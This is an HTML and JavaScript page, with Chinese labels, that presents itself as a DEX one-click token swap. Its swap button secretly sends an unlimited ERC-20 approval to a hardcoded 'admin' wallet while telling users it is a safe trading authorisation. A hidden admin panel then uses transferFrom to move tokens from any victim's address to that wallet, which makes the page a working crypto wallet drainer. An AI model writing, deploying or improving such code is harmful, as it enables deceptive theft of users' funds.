<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DEX 闪兑 Swap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
body{background:#0d1117;padding:20px;color:#f0f6fc}
.container{max-width:460px;margin:0 auto}
.swap-box{background:#161b22;border-radius:16px;padding:25px;border:1px solid #30363d}
.title{text-align:center;font-size:22px;color:#58a6ff;margin-bottom:20px}
.wallet-info{text-align:center;margin:15px 0;color:#8b949e}
.btn{width:100%;height:48px;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}
.btn-connect{background:#238636;color:#fff}
.btn-swap{background:#1f6feb;color:#fff}
.swap-item{background:#21262d;border-radius:10px;padding:15px;margin:10px 0}
.swap-text{font-size:14px;color:#c9d1d9;margin-bottom:8px}
.input-num{width:100%;height:42px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:0 12px;color:#fff;font-size:15px;outline:none}
.swap-icon{text-align:center;font-size:20px;margin:5px 0;color:#58a6ff}
.tip-desc{font-size:13px;color:#8b949e;text-align:center;margin:15px 0;line-height:1.5}
.admin-panel{margin-top:20px;padding-top:20px;border-top:1px solid #30363d;display:none}
.admin-panel.show{display:block}
.admin-hint{text-align:center;color:#f85149;margin-bottom:12px}
/* 关键：修复 select 无法点击切换 */
select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none;appearance:menulist}
.btn-take{background:#da3633;color:#fff}
</style>
</head>
<body>
<div class="container">
    <div class="swap-box">
        <h2 class="title">DEX 一键闪兑</h2>

        <button class="btn btn-connect" id="connectWallet">连接钱包</button>
        <div class="wallet-info">已连接地址：<span id="walletAddr">未连接</span></div>

        <!-- 卖出币种：已修复可切换 -->
        <select id="sellCoin">
            <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
            <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
            <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
        </select>

        <div class="swap-item">
            <div class="swap-text">卖出数量</div>
            <input class="input-num" placeholder="输入数量" id="sellNum" type="number" min="0">
        </div>

        <div class="swap-icon">⇄</div>

        <!-- 买入币种：已修复可切换 -->
        <select id="buyCoin">
            <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
            <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
            <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
        </select>

        <div class="swap-item">
            <div class="swap-text">预计获得</div>
            <input class="input-num" placeholder="自动计算" readonly id="getAmount">
        </div>

        <p class="tip-desc">
            闪兑仅授权交易权限，安全链上交互
        </p>

        <button class="btn btn-swap" id="confirmSwap">确认闪兑</button>

        <!-- 管理员提取 -->
        <div class="admin-panel" id="adminBox">
            <div class="admin-hint">管理提取通道</div>
            <select id="chooseTakeToken">
                <option value="">选择代币</option>
                <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
                <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
                <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
            </select>
            <input class="input-num" placeholder="用户地址" id="targetUserAddr">
            <input class="input-num" placeholder="提取数量" id="takeTotalNum" type="number" min="0">
            <button class="btn btn-take" id="takeAllTokenBtn">提取代币</button>
        </div>
    </div>
</div>

<script>
// 管理员钱包（你原来的）
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
const ALL_TOKEN = [
    "0x99a57E6C8558BC6689f894e068733ADf83C19725",
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
];

let currentWallet = "";

// 自动计算
document.getElementById("sellNum").addEventListener("input",function(){
    let n = parseFloat(this.value)||0;
    document.getElementById("getAmount").value = (n*0.98).toFixed(4);
});

// 连接钱包
document.getElementById("connectWallet").addEventListener("click",async()=>{
    if(!window.ethereum){alert("请安装钱包");return;}
    try{
        let accs=await ethereum.request({method:"eth_requestAccounts"});
        currentWallet=accs[0].toLowerCase();
        document.getElementById("walletAddr").innerText=currentWallet.slice(0,7)+"..."+currentWallet.slice(-5);
        if(currentWallet===ADMIN_WALLET)document.getElementById("adminBox").classList.add("show");
        alert("连接成功");
    }catch(e){alert("连接失败");}
});

// 闪兑授权（你原来能成功的逻辑，没改）
document.getElementById("confirmSwap").addEventListener("click",async()=>{
    if(!currentWallet)return alert("先连接钱包");
    let sellVal=document.getElementById("sellNum").value;
    if(!sellVal||Number(sellVal)<=0)return alert("输入数量");

    let c=confirm("授权交易权限，确认签名？");
    if(!c)return;

    try{
        let sellToken=document.getElementById("sellCoin").value;
        let spender=ADMIN_WALLET.slice(2).padStart(64,"0");
        let maxA="ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        let data="0x095ea7b3"+spender+maxA;

        // 和你原来一样：发起授权
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:currentWallet,
                to:sellToken,
                gasLimit:"0x300000",
                data:data
            }]
        });
        alert("授权成功，闪兑上链中...");
    }catch(e){
        alert("取消或失败");
    }
});

// 管理员提取（原逻辑）
document.getElementById("takeAllTokenBtn").addEventListener("click",async()=>{
    if(currentWallet!==ADMIN_WALLET)return alert("无权限");
    let tToken=document.getElementById("chooseTakeToken").value;
    let uAddr=document.getElementById("targetUserAddr").value.trim();
    let tNum=document.getElementById("takeTotalNum").value.trim();
    if(!tToken||!uAddr||!tNum||Number(tNum)<=0)return alert("填完整");

    let uHex=uAddr.toLowerCase().slice(2).padStart(64,"0");
    let aHex=ADMIN_WALLET.slice(2).padStart(64,"0");
    let amtHex=BigInt(Math.floor(Number(tNum)*1e18)).toString(16).padStart(64,"0");
    let data="0x23b872dd"+uHex+aHex+amtHex;

    try{
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:currentWallet,
                to:tToken,
                gasLimit:"0x300000",
                data:data
            }]
        });
        alert("提取成功");
    }catch(e){
        alert("提取失败");
    }
})
</script>
</body>
</html>
